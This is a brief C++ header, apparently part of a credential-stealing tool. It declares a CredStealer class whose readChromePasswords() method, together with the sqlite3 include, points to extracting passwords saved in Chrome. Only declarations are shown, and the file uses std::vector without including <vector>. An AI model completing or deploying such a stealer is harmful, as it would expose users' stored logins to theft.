#include <list>
#include <string>
#include <sqlite3.h>
#include "ComboEntry.h"

class CredStealer 
{
    ComboEntry entry;
    public:
	void setEntry(ComboEntry entry);
	ComboEntry getEntry();
	std::vector<ComboEntry> readChromePasswords();	
};


